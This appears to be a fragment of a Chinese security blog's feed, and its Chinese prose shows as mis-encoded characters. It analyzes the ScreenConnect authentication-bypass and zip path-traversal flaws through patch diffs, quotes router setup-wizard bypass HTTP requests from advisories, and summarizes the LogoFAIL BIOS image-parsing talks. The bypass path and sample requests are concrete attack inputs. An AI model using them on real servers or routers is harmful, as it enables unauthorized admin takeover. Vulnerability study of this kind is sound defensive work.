class="number">1</span>a2</span><br><span class="line">&gt; &lt;%@ Implements Interface=<span class="string">"ScreenConnect.ISetupHandler"</span> %&gt;</span><br><span class="line"><span class="number">5</span>a7,<span class="number">14</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnInit</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line"><span class="function">&gt;</span>     &#123;</span><br><span class="line">&gt;         <span class="keyword">base</span>.OnInit(e);</span><br><span class="line">&gt;</span><br><span class="line">&gt;         <span class="keyword">if</span> (SetupModule.IsSetup)</span><br><span class="line">&gt;             <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">"Already setup"</span>);</span><br><span class="line">&gt;     &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œ<code>ScreenConnect\Bin\ScreenConnect.Web.dll</code> ä¸­ï¼Œ<code>ScreenConnect.SetupModule</code> ä¸­ <code>OnBeginRequest</code> å˜æˆäº† <code>OnPostMapRequestHandler</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnPostMapRequestHandler</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HttpContext context = ((HttpApplication)sender).Context;</span><br><span class="line">    <span class="keyword">string</span> text = context.Response.ApplyAppPathModifier(ConfigurationCache.SetupPage);</span><br><span class="line">    <span class="keyword">bool</span> flag = context.Handler <span class="keyword">is</span> ISetupHandler || <span class="comment">// --&gt; æ–°å¢æ¡ä»¶</span></span><br><span class="line">                <span class="keyword">string</span>.Equals(context.Request.Path, text, StringComparison.OrdinalIgnoreCase); <span class="comment">// --&gt; ä¹‹å‰å¯ç»•è¿‡</span></span><br><span class="line">    <span class="keyword">if</span> (!ConfigurationCache.IsSetup)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ConfigurationCache.AllowRemoteSetup &amp;&amp; !context.Request.IsLocal)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">403</span>, <span class="string">"Application is in setup mode and is only accessible from local machine."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag &amp;&amp; Regex.IsMatch(context.Request.Path, ConfigurationCache.SetupRedirectFilter))</span><br><span class="line">        &#123;</span><br><span class="line">            context.Response.Redirect(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ConfigurationCache.AlreadySetupPage == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">403</span>, <span class="string">"Application is already setup."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">string</span> url = context.Response.ApplyAppPathModifier(ConfigurationCache.AlreadySetupPage);</span><br><span class="line">        context.Response.Redirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå¯¹äº <code>SetupWizard.aspx</code> çš„è®¿é—®ï¼Œä¸Šé¢è¿™æ®µä»£ç åŸæœ¬å·²ç»æœ‰äº†ç›¸å…³æ£€æŸ¥é€»è¾‘ï¼Œä½†æ˜¯å¯¹ URL Path çš„åˆ¤æ–­åœ¨æ—§ç‰ˆæœ¬ä¸­æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚å› ä¸º .NET æœ‰ä¸ªå¥‡æ€ªçš„ç‰¹æ€§ï¼šè¯·æ±‚çš„ URL Path åé¢ç«Ÿç„¶è¿˜å¯ä»¥é™„åŠ é¢å¤–çš„ä¿¡æ¯ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: http://www.contoso.com/virdir/page.html/tail</span><br><span class="line">FilePath: /virdir/page.html</span><br><span class="line">PathInfo: /tail</span><br><span class="line">Path: FilePath + PathInfo = /virdir/page.html/tail</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>context.Request.Path</code> å¯ä»¥æ˜¯ <code>/SetupWizard.aspx/literallyanything</code>ï¼Œå› æ­¤è®¿é—® <code>/SetupWizard.aspx/</code> å³å¯è§¦å‘æ¼æ´ã€‚åœ¨è¿™ä¸ªé¡µé¢å¯ä»¥é‡æ–°è®¾ç½®ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œä¹‹åç›´æ¥é‡ç½®å’Œè¦†ç›–åŸæœ‰çš„æ•°æ®åº“ã€‚</p><h3 id="2-2-ç±»ä¼¼æ¼æ´"><a href="#2-2-ç±»ä¼¼æ¼æ´" class="headerlink" title="2.2 ç±»ä¼¼æ¼æ´"></a>2.2 ç±»ä¼¼æ¼æ´</h3><p><a href="https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/" target="_blank" rel="noopener">Drive-By Compromise: A Tale Of Four Wifi Routers</a> ç»™å‡ºäº†ä¸€ä¸ªè·¯ç”±å™¨ä¸Šçš„ç±»ä¼¼æ¼æ´ï¼šè·¯ç”±å™¨åˆå§‹åŒ–è®¾ç½®é¡µé¢ï¼ˆSetup Wizardï¼‰åœ¨å·²ç»è®¾ç½®è¿‡çš„æƒ…å†µä¸‹ï¼Œæ— éœ€æˆæƒä»ç„¶å¯ä»¥å†æ¬¡è®¿é—®ï¼Œå› æ­¤å¯ä»¥é€šè¿‡é’“é±¼æ¥å®ç°ç®¡ç†å‘˜è´¦å·é‡ç½®ï¼Œæ¯”å¦‚å—å®³è€…è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„ç½‘é¡µæ—¶è‡ªåŠ¨å‘é€å¦‚ä¸‹ HTTP è¯·æ±‚ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="tag">&lt;<span class="name">HTTP</span> <span class="attr">headers</span> <span class="attr">redacted</span> <span class="attr">for</span> <span class="attr">brevity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">page=sysinit&amp;newpass=<span class="tag">&lt;<span class="name">attacker-supplied</span> <span class="attr">password</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tenable.com/security/research/tra-2021-54" target="_blank" rel="noopener">Trendnet AC2600 TEW-827DRU Multiple Vulnerabilities</a> ä¹Ÿæœ‰ä¸€ä¸ª Setup Wizard ç›¸å…³çš„æ¼æ´æ¡ˆä¾‹ï¼š</p><blockquote><p><strong>Information Disclosure via Setup Wizard -</strong> <strong>CVE-2021-20150</strong></p><p>Authentication can be bypassed and a user may view information as Admin by manually browsing to the setup wizard and forcing it to redirect to the desired page. The following is an example request:</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /apply_sec.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 107</span><br><span class="line">Origin: http://192.168.10.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.10.1/setup_wizard.asp</span><br><span class="line">Cookie: compact_display_state=false</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">action=setup_wizard_cancel&amp;html_response_page=client_status.asp&amp;html_response_return_page=client_status.asp</span><br></pre></td></tr></table></figure><p>é€šè¿‡ Setup Wizard å®ç°æœªæˆæƒè®¿é—®ç‰¹å®šé¡µé¢ã€‚</p><h2 id="0x03-CVE-2024-1708"><a href="#0x03-CVE-2024-1708" class="headerlink" title="0x03. CVE-2024-1708"></a>0x03. CVE-2024-1708</h2><p>è¿™æ˜¯ä¸€ä¸ª Zip è§£å‹åœºæ™¯ä¸‹çš„è·¯å¾„ç©¿è¶Šæ¼æ´ã€‚</p><p><code>ScreenConnect.Core.dll</code> è¡¥ä¸å¯¹æ¯”ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11057</span>c11057</span><br><span class="line">&lt;         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExtractAllEntries</span>(<span class="params"><span class="keyword">string</span> basePath</span>)</span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function">&gt;         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExtractAllEntries</span>(<span class="params"><span class="keyword">string</span> basePath, <span class="keyword">string</span> requireEntriesInMoreStringentPath = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">11062c11062</span></span><br><span class="line"><span class="function">&lt;                 FileSystemExtensions.<span class="title">DemandInParentPath</span>(<span class="params">basePath, text</span>)</span>;</span><br><span class="line">---</span><br><span class="line">&gt;                 FileSystemExtensions.DemandInParentPath(requireEntriesInMoreStringentPath ?? basePath, text);</span><br></pre></td></tr></table></figure><p><code>ScreenConnect.Server.dll</code> è¡¥ä¸å¯¹æ¯”ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8392</span>a8393</span><br><span class="line">&gt;             DirectoryInfo extensionsDirectory = GetExtensionsDirectory();</span><br><span class="line"><span class="number">8398</span>c8399</span><br><span class="line">&lt;             zipFile.ExtractAllEntries(GetExtensionsDirectory().FullName);</span><br><span class="line">---</span><br><span class="line">&gt;             zipFile.ExtractAllEntries(extensionsDirectory.FullName, extensionDirectory.FullName);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥å®ç°ä¸€å±‚ç›®å½•ç©¿è¶Šï¼Œå³æ’ä»¶ X çš„æ–‡ä»¶ï¼Œå¯ä»¥è§£å‹åˆ°æ’ä»¶ Y çš„ç›®å½•ä¸‹ï¼Œä½†ä¸ä¼šç©¿è¶Šå‡ºå¤§çš„æ’ä»¶ç›®å½• <code>ScreenConnect\App_Extensions</code>ã€‚</p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04. å°ç»“"></a>0x04. å°ç»“</h2><p>ä¸¤ç±»æ¼æ´ï¼š</p><ul><li>Setup Wizard æœªæˆæƒè®¿é—®æ¼æ´</li><li>Zip è§£å‹è·¯å¾„ç©¿è¶Šæ¼æ´</li></ul><h2 id="0x05-å‚è€ƒæ–‡æ¡£"><a href="#0x05-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x05. å‚è€ƒæ–‡æ¡£"></a>0x05. å‚è€ƒæ–‡æ¡£</h2><ol><li><a href="https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/" target="_blank" rel="noopener">https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/</a></li><li><a href="https://attack.mitre.org/tactics/TA0001/" target="_blank" rel="noopener">https://attack.mitre.org/tactics/TA0001/</a></li><li><a href="https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass" target="_blank" rel="noopener">https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass</a></li><li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.8.1" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.8.1</a></li><li><a href="https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/" target="_blank" rel="noopener">https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/</a></li><li><a href="https://www.tenable.com/security/research/tra-2021-54" target="_blank" rel="noopener">https://www.tenable.com/security/research/tra-2021-54</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘ ConnectWise ScreenConnect çˆ†äº† 2 ä¸ªæ¼æ´ï¼ˆCVE-2024-1709 å’Œ CVE-2024-1708ï¼‰ï¼Œå…¶ä¸­ &lt;strong&gt;CVE-2024-1709&lt;/strong&gt; æ˜¯ä¸€ä¸ª Authentication Bypass æ¼æ´ï¼ŒCVSS è¯„åˆ† 10 åˆ†ã€‚Sophos å®‰å…¨å›¢é˜Ÿè¡¨ç¤ºï¼Œå‹¤åŠ³çš„æ”»å‡»è€…å·²ç»åœ¨ç¬¬ä¸€æ—¶é—´åˆ©ç”¨è¿™äº›æ¼æ´æ¥æŠ•é€’å‹’ç´¢è½¯ä»¶ã€‚æœ¬æ–‡ç®€å•æ•´ç†ç›¸å…³ä¿¡æ¯ï¼Œä½œä¸ºæ¼æ´æ¡ˆä¾‹ç ”ç©¶ç³»åˆ—çš„ç¬¬ä¸€ç¯‡æ–‡ç« ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Authentication Bypass" scheme="http://programlife.net/tags/Authentication-Bypass/"/>
    
      <category term="Path Traversal" scheme="http://programlife.net/tags/Path-Traversal/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Europe 2023 è®®é¢˜å­¦ä¹ ï¼ˆäºŒï¼‰</title>
    <link href="http://programlife.net/2024/01/28/BHEU-2023-Learning-Part2/"/>
    <id>http://programlife.net/2024/01/28/BHEU-2023-Learning-Part2/</id>
    <published>2024-01-28T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>BlackHat Europe 2023 - <a href="https://www.blackhat.com/eu-23/briefings/schedule/index.html#logofail-security-implications-of-image-parsing-during-system-boot-35042" target="_blank" rel="noopener">LogoFAIL: Security Implications of Image Parsing During System Boot</a></p><p>BlackHat USA 2009 - <a href="https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf" target="_blank" rel="noopener">Attacking IntelÂ® BIOS</a> - PDF</p><a id="more"></a><h2 id="0x01-è®®é¢˜ç®€ä»‹"><a href="#0x01-è®®é¢˜ç®€ä»‹" class="headerlink" title="0x01. è®®é¢˜ç®€ä»‹"></a>0x01. è®®é¢˜ç®€ä»‹</h2><p>ã€ŠLogoFAIL: Security Implications of Image Parsing During System Bootã€‹è¿™ä¸ªè®®é¢˜ä¸»è¦ä»‹ç» BIOS å¯åŠ¨æ—¶ Logo å›¾ç‰‡è§£æç›¸å…³çš„æ¼æ´ï¼Œé¡ºä¾¿æåŠäº† 2009 å¹´çš„ä¸€ä¸ªç±»ä¼¼çš„è®®é¢˜ã€ŠAttacking IntelÂ® BIOSã€‹ï¼Œä¹Ÿæ˜¯ BIOS å¯åŠ¨æ—¶ BMP è§£æå¯¼è‡´çš„æ•´æ•°æº¢å‡ºæ¼æ´ã€‚æ‰€ä»¥ï¼Œä½œè€…ä¹Ÿæ„Ÿå¹ History Repeats Itselfã€‚</p><p>åœ¨æ¼æ´æŒ–æ˜è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»é¢çš„æŒ–æ˜æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç‚¹ï¼Œå¦‚æœèƒ½æ‰¾åˆ°å¤§å®¶ï¼ˆå‚å•†ã€å®‰å…¨ç ”ç©¶å‘˜ã€æ”»å‡»è€…ï¼‰éƒ½æ²¡æ€ä¹ˆå…³æ³¨è¿‡çš„æ”»å‡»é¢ï¼Œææœ‰å¯èƒ½æ”¶è·ä¸€æ³¢ Low Hanging Fruitsã€‚</p><h2 id="0x02-Attacking-Intel-BIOS"><a href="#0x02-Attacking-Intel-BIOS" class="headerlink" title="0x02. Attacking Intel BIOS"></a>0x02. Attacking Intel BIOS</h2><h3 id="2-1-ç ”ç©¶æ€è·¯"><a href="#2-1-ç ”ç©¶æ€è·¯" class="headerlink" title="2.1 ç ”ç©¶æ€è·¯"></a>2.1 ç ”ç©¶æ€è·¯</h3><p>æ›´æ–° BIOS å›ºä»¶æ—¶ï¼Œå›ºä»¶åŒ…å¿…é¡»æœ‰åˆæ³•çš„æ•°å­—ç­¾åï¼Œä½œè€…çš„æ€è·¯æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä¸éœ€è¦ç­¾åçš„æ•°æ®ï¼Œåœ¨è¿™éƒ¨åˆ†æ•°æ®ä¸Šåšç ”ç©¶ã€‚è€Œ BIOS çš„ Logo å›¾ç‰‡ä¾¿æ»¡è¶³è¿™ä¸€æ¡ä»¶ï¼Œåœ¨å¯åŠ¨çš„æ—©æœŸé˜¶æ®µï¼Œå›¾ç‰‡ä¼šè¢«è§£æå’Œå±•ç¤ºï¼Œè¿™å°±æ¥åˆ°äº†ç»å…¸çš„æ–‡ä»¶æ ¼å¼è§£æé—®é¢˜ã€‚</p><h3 id="2-2-æ¼æ´æ¡ˆä¾‹"><a href="#2-2-æ¼æ´æ¡ˆä¾‹" class="headerlink" title="2.2 æ¼æ´æ¡ˆä¾‹"></a>2.2 æ¼æ´æ¡ˆä¾‹</h3><p>è§£æ BMP å›¾ç‰‡æ ¼å¼æ—¶ï¼Œå­˜åœ¨ç»å…¸çš„æ•´æ•°æº¢å‡ºæ¼æ´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EFI_STATUS <span class="title">ConvertBmpToGopBlt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">if</span> (BmpHeader-&gt;CharB != <span class="string">'B'</span> || BmpHeader-&gt;CharM != <span class="string">'M'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line">    BltBufferSize = BmpHeader-&gt;PixelWidth * BmpHeader-&gt;PixelHeight</span><br><span class="line">        * <span class="keyword">sizeof</span> (EFI_GRAPHICS_OUTPUT_BLT_PIXEL);</span><br><span class="line">    IsAllocated = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (*GopBlt == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *GopBltSize = BltBufferSize;</span><br><span class="line">        *GopBlt = EfiLibAllocatePool(*GopBltSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè§¦å‘äº†æ•´æ•°æº¢å‡ºï¼Œä¼šå¯¼è‡´å‘ç›®æ ‡ç¼“å†²åŒºå†™å…¥å¤§é‡æ•°æ®ï¼Œç›´åˆ°è®¿é—®åˆ°æœªæ˜ å°„çš„å†…å­˜é¡µï¼Œè§¦å‘ Page Fault å¼‚å¸¸ã€‚ä½œè€…çš„åˆ©ç”¨æ€è·¯æ˜¯ï¼Œåœ¨æº¢å‡ºçš„è¿‡ç¨‹ä¸­æ”¹å†™ Page Fault Exception Handlerï¼Œè®©å…¶è·³è½¬åˆ° BMP å›¾ç‰‡ä¸­çš„æ‰§è¡Œ Shellcodeã€‚åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202401/BMP-Parsing-Integer-Overflow-Exploit.webp" alt="BMP è§£ææ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨"></p><h2 id="0x03-LogoFAIL"><a href="#0x03-LogoFAIL" class="headerlink" title="0x03. LogoFAIL"></a>0x03. LogoFAIL</h2><p>ç ”ç©¶æ€è·¯å’Œå‰é¢æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œå‘ç° UEFI å›ºä»¶ä¼šè§£æå¦‚ä¸‹å›¾ç‰‡æ ¼å¼ï¼šBMPã€GIFã€PNGã€JPEGã€PCX ä»¥åŠ TGAã€‚ä½œè€…åœ¨ä»¿çœŸçš„ç¯å¢ƒä¸‹åšäº†ä¸€äº›åŸºäº LibAFL çš„ Fuzzingã€‚</p><h3 id="3-1-æ¼æ´æ¡ˆä¾‹"><a href="#3-1-æ¼æ´æ¡ˆä¾‹" class="headerlink" title="3.1 æ¼æ´æ¡ˆä¾‹"></a>3.1 æ¼æ´æ¡ˆä¾‹</h3><p>BMP è§£æç¼“å†²åŒºä¸‹æº¢æ¼æ´ã€‚</p><p><img src="/uploads/202401/BMP-Parsing-Buffer-Underflow.webp" alt="BMP è§£æç¼“å†²åŒºä¸‹æº¢æ¼æ´"></p><p>JPEG è§£æå†…å­˜ç ´åæ¼æ´ï¼ˆæœªæ ¡éªŒ Huffman Table ä¸ªæ•°ï¼‰ã€‚</p><p><img src="/uploads/202401/JPEG-Parsing-HT-Memory-Corruption.webp" alt="JPEG è§£æå†…å­˜ç ´åæ¼æ´"></p><p>PNG è§£ææ•´æ•°æº¢å‡ºæ¼æ´ã€‚</p><p><img src="/uploads/202401/PNG-Parsing-Integer-Overflow.webp" alt="PNG è§£ææ•´æ•°æº¢å‡ºæ¼æ´"></p><h3 id="3-2-ç§å­æ–‡ä»¶"><a href="#3-2-ç§å­æ–‡ä»¶" class="headerlink" title="3.2 ç§å­æ–‡ä»¶"></a>3.2 ç§å­æ–‡ä»¶</h3><p>PCX æ˜¯ä¸€ç§ä¸Šå¤æ—¶æœŸçš„æ–‡ä»¶æ ¼å¼ï¼Œç°åœ¨åŸºæœ¬æ²¡äººç”¨äº†ï¼Œä½œè€…åœ¨ Internet Archive ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸‹è½½è¿æ¥ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://archive.org/details/Universe_Of_PCX_1700_PCX_Files</span><br></pre></td></tr></table></figure><p>ç¬”è€…åœ¨è¿‡å»çš„å·¥ä½œä¸­ä¹Ÿåšè¿‡ PCX Fuzzingï¼Œä¸è¿‡éƒ½æ˜¯ Google ä¸Šæ‰¾çš„å°‘é‡é›¶æ˜Ÿçš„æ ·æœ¬ğŸ¤£ã€‚</p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04. å°ç»“"></a>0x04. å°ç»“</h2><p>æ”»å‡»é¢æŒ–æ˜æ˜¯é‡ç‚¹ï¼Œè€è®®é¢˜ä¹Ÿå€¼å¾—å›é¡¾ï¼ˆå¯ä»¥å¼€é˜”æ€è·¯ï¼‰ã€‚å½“ç„¶ï¼ŒLogoFAIL ä¸­çš„ç ”ç©¶ä¹Ÿæ˜¯æœ‰è¾ƒé«˜é—¨æ§›çš„ï¼Œåœ¨å½“å‰çš„å›½å†…ç¯å¢ƒä¸‹ï¼Œä¸€èˆ¬çš„å…¬å¸å¾ˆå¯èƒ½æ˜¯ä¸ä¼šç»™è¿™ä¸ªæ—¶é—´å»ç ”ç©¶çš„ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BlackHat Europe 2023 - &lt;a href=&quot;https://www.blackhat.com/eu-23/briefings/schedule/index.html#logofail-security-implications-of-image-parsing-during-system-boot-35042&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;LogoFAIL: Security Implications of Image Parsing During System Boot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;BlackHat USA 2009 - &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Attacking IntelÂ® BIOS&lt;/a&gt; - PDF&lt;/p&gt;
    
    </summary>
    
      <category term="Conferences" scheme="http://programlife.net/categories/Conferences/"/>
    
      <category term="BlackHat" scheme="http://programlife.net/categories/Conferences/BlackHat/"/>
    
    
      <category term="BIOS" scheme="http://programlife.net/tags/BIOS/"/>
    
      <category term="File Format Fuzzing" scheme="http://programlife.net/tags/File-Format-Fuzzing/"/>
    
      <category term="Internet Archive" scheme="http://programlife.net/tags/Internet-Archive/"/>
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="PCX" scheme="http://programlife.net/tags/PCX/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Europe 2023 è®®é¢˜å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
    <link href="http://programlife.net/2024/01/06/BHEU-2023-Learning-Part1/"/>
    <id>http://programlife.net/2024/01/06/BHEU-2023-Learning-Part1/</id>
    <published>2024-01-06T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.blackhat.com/eu-23/briefings/schedule/index.html#old-code-dies-hard-finding-new-vulnerabilities-in-old-third-party-software-components-and-the-importance-of-having-sbom-for-iotot-devices-35349" target="_blank" rel="noopener"><strong>Old code dies hard:</strong> Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices</a></p><a id="more"></a><h2 id="0x01-ç ”ç©¶æ€è·¯"><a href="#0x01-ç ”ç©¶æ€è·¯" class="headerlink" title="0x01. ç ”ç©¶æ€è·¯"></a>0x01. ç ”ç©¶æ€è·¯</h2><p>ç ”ç©¶ç›®æ ‡ï¼šSierra Wireless AirLink Gateways</p><p>ç›®æ ‡æœé›†ï¼šShodan æœç´¢ ACEmanager çš„æŒ‡çº¹</p><ul><li>ACEmanager æ˜¯ Sierra Wireless AirLink Gateways çš„ Web ç®¡ç†ç³»ç»Ÿ</li><li>ACEmanager ä¸åº”è¯¥æš´éœ²åœ¨å…¬ç½‘</li></ul><p>å‰äººç ”ç©¶ï¼š</p><ul><li>Cisco Talosã€IOActive ç­‰éƒ½å¼€å±•è¿‡ç›¸å…³ç ”ç©¶ï¼Œä½†æ›´å¤šå…³æ³¨ç›®æ ‡æœ¬èº«çš„ä»£ç ï¼Œæ¯”å¦‚ ACEmanager ç­‰</li><li>æ²¡æœ‰æåŠç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ¼æ´é—®é¢˜</li></ul><p>ä½œè€…çš„ç ”ç©¶æ€è·¯ï¼š</p><ul><li>è·å–è®¾å¤‡ã€å›ºä»¶ã€è½¯ä»¶åŒ…</li><li>å›ºä»¶è§£å‹ã€è§£å¯†<ul><li>è€ç‰ˆæœ¬çš„å›ºä»¶æ²¡æœ‰åŠ å¯†ï¼Œè¿˜å¸¦æœ‰è°ƒè¯•ç¬¦å·</li><li>æ–°ç‰ˆæœ¬çš„å›ºä»¶å¯ä»¥ç”¨ IOActive çš„å…¬å¼€æ–¹æ³•è§£å¯†</li><li>ä½¿ç”¨ Qemu æ¥æ¨¡æ‹Ÿè¿è¡Œç¯å¢ƒ</li></ul></li><li>é»‘ç›’åŠŸèƒ½åˆ†æ</li><li>è½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰</li><li>å¯¹é«˜ä¼˜ç›®æ 